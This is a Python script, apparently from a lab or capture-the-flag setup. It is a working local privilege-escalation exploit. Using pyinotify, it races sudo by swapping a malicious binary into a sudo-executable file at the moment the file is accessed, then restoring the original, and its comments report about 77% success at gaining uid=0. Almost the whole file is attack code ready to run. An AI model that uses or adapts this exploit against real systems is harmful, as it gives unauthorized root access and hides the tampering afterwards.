#!/usr/bin/env python3
import pyinotify
from shutil import copy
import time

# Useful for debugging:
# python3 -m pyinotify -v /opt/sudoable

# This script is inspired by
# <https://www.saltycrane.com/blog/2010/04/monitoring-filesystem-python-and-pyinotify/>

# This script wins the race approx. 70% of the time on my machine per the following:

"""
root@25dab2a48c66:/# for i in {1..100}; do sudo -u executor sudo --non-interactive /opt/sudoable 2>&1; sleep 1; done | sort | uniq -c | sort -n
     23 sudo: unable to execute /opt/sudoable: Text file busy
     77 Goodbye uid=0
"""

# Could potentially be improved by not using Python, or with some Unix magic


class MyEventHandler(pyinotify.ProcessEvent):
    def __init__(self, watched_file, good_file, bad_file):
        self.watched_file = watched_file
        self.good_file = good_file
        self.bad_file = bad_file

    def process_IN_ACCESS(self, event):
        #print("ACCESS event:", event.pathname)
        time.sleep(0.0005)
        try:
            # Make a single attempt at replacing the sudoable file with the bad file
            copy(self.bad_file, self.watched_file)
        except:
            pass

    def process_IN_CLOSE_NOWRITE(self, event):
        #print("CLOSE_NOWRITE event:", event.pathname)
        while True:
            # Insist on replacing the sudoable file with the good file
            try:
                copy(self.good_file, self.watched_file)
                break
            except Exception as e:
                pass


def main():
    watched_file = "/opt/sudoable"
    good_file = "/opt/hello"
    bad_file = "/opt/goodbye"

    # create watch manager
    wm = pyinotify.WatchManager()
    wm.add_watch(watched_file, pyinotify.ALL_EVENTS, rec=True)

    # create event handler
    eh = MyEventHandler(watched_file, good_file, bad_file)

    # create notifier
    notifier = pyinotify.Notifier(wm, eh)
    # run notifier
    notifier.loop()


if __name__ == "__main__":
    main()
